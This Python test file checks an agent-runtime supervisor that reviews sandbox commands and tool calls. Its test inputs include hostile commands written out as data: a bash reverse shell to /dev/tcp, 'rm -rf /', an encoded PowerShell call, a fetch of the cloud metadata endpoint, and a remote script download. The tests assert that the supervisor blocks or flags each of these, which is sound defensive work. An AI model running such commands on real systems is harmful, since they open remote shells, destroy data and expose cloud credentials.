from __future__ import annotations

from typing import Any

from app.orchestrator.supervisor import build_supervisor
from app.runtime.sandboxrouter import SandboxExecutionRequest
from app.runtime.toolcallguard import ToolCallRequest, build_toolcallguard


def _route_result(verdict: str, *, executed: bool = False, executionstate: str = "denied") -> dict[str, Any]:
    return {
        "verdict": verdict,
        "executed": executed,
        "executionstate": executionstate,
        "reasons": [{"label": f"route-{verdict}"}],
        "request": {"target": "shell"},
    }


def test_supervisor_allows_safe_sandbox_execution() -> None:
    supervisor = build_supervisor()

    result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command=["python", "-c", "print('safe')"],
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] in {"allow", "review", "approve"}
    assert result["runtime"]["target"] == "shell"


def test_supervisor_blocks_known_malicious_command() -> None:
    supervisor = build_supervisor()

    result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command="bash -i >& /dev/tcp/10.10.10.10/9001 0>&1",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] in {"block", "quarantine"}
    assert result["runtime"]["target"] == "shell"


def test_supervisor_routes_blocked_runtime_to_incident_shape() -> None:
    supervisor = build_supervisor(
        sandbox_router=type(
            "RouterStub",
            (),
            {
                "route": staticmethod(
                    lambda request: _route_result(
                        "block",
                        executed=False,
                        executionstate="denied",
                    ),
                ),
            },
        )(),
    )

    result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command="powershell -enc bad",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "block"
    assert result["runtime"]["executionstate"] == "denied"
    assert result["requires_incident"] is True


def test_supervisor_preserves_executed_runtime_result() -> None:
    supervisor = build_supervisor(
        sandbox_router=type(
            "RouterStub",
            (),
            {
                "route": staticmethod(
                    lambda request: _route_result(
                        "allow",
                        executed=True,
                        executionstate="executed",
                    ),
                ),
            },
        )(),
    )

    result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command=["python", "-c", "print('ok')"],
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "allow"
    assert result["runtime"]["executed"] is True
    assert result["requires_incident"] is False


def test_supervisor_reviews_high_risk_tool_call() -> None:
    supervisor = build_supervisor(toolcall_guard=build_toolcallguard())

    result = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="bash",
            actiontype="toolcall",
            target="runtime",
            command="bash -lc 'echo test'",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] in {"review", "block", "quarantine"}
    assert result["toolcall"]["toolname"] == "bash"


def test_supervisor_blocks_metadata_tool_fetch() -> None:
    supervisor = build_supervisor(toolcall_guard=build_toolcallguard())

    result = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="http",
            actiontype="toolcall",
            target="runtime",
            network_url="http://169.254.169.254/latest/meta-data/",
            network_method="GET",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] in {"block", "quarantine"}
    assert result["requires_incident"] is True


def test_supervisor_marks_quarantine_for_quarantine_tool_verdict() -> None:
    quarantine_guard = type(
        "QuarantineGuard",
        (),
        {
            "evaluate": staticmethod(
                lambda request: type(
                    "Decision",
                    (),
                    {
                        "verdict": "quarantine",
                        "allowed": False,
                        "should_review": False,
                        "should_block": True,
                        "should_quarantine": True,
                        "risk_delta": 95,
                        "tool_name": request.tool_name,
                        "actiontype": request.actiontype,
                        "target": request.target,
                        "reasons": [{"label": "quarantine"}],
                        "command_policy": {},
                        "network_policy": {},
                        "artifact_policies": [],
                        "as_dict": lambda self: {
                            "verdict": "quarantine",
                            "allowed": False,
                            "shouldreview": False,
                            "shouldblock": True,
                            "shouldquarantine": True,
                            "riskdelta": 95,
                            "toolname": request.tool_name,
                            "actiontype": request.actiontype,
                            "target": request.target,
                            "reasons": [{"label": "quarantine"}],
                            "commandpolicy": {},
                            "networkpolicy": {},
                            "artifactpolicies": [],
                        },
                    },
                )(),
            ),
        },
    )()

    supervisor = build_supervisor(toolcall_guard=quarantine_guard)

    result = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="bash",
            actiontype="toolcall",
            target="runtime",
            command="rm -rf /",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "quarantine"
    assert result["requires_incident"] is True


def test_supervisor_normalizes_missing_runtime_reasons() -> None:
    supervisor = build_supervisor(
        sandbox_router=type(
            "RouterStub",
            (),
            {
                "route": staticmethod(
                    lambda request: {
                        "verdict": "review",
                        "executed": False,
                        "executionstate": "pending_review",
                        "request": {"target": request.target},
                    },
                ),
            },
        )(),
    )

    result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command="curl https://example.com/script.sh",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "review"
    assert isinstance(result["runtime"]["reasons"], list)


def test_supervisor_normalizes_missing_toolcall_reasons() -> None:
    sparse_guard = type(
        "SparseGuard",
        (),
        {
            "evaluate": staticmethod(
                lambda request: type(
                    "Decision",
                    (),
                    {
                        "verdict": "review",
                        "allowed": True,
                        "should_review": True,
                        "should_block": False,
                        "should_quarantine": False,
                        "risk_delta": 25,
                        "tool_name": request.tool_name,
                        "actiontype": request.actiontype,
                        "target": request.target,
                        "reasons": None,
                        "command_policy": {},
                        "network_policy": {},
                        "artifact_policies": [],
                        "as_dict": lambda self: {
                            "verdict": "review",
                            "allowed": True,
                            "shouldreview": True,
                            "shouldblock": False,
                            "shouldquarantine": False,
                            "riskdelta": 25,
                            "toolname": request.tool_name,
                            "actiontype": request.actiontype,
                            "target": request.target,
                            "reasons": None,
                            "commandpolicy": {},
                            "networkpolicy": {},
                            "artifactpolicies": [],
                        },
                    },
                )(),
            ),
        },
    )()

    supervisor = build_supervisor(toolcall_guard=sparse_guard)

    result = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="bash",
            actiontype="toolcall",
            target="runtime",
            command="echo hi",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "review"
    assert isinstance(result["toolcall"]["reasons"], list)
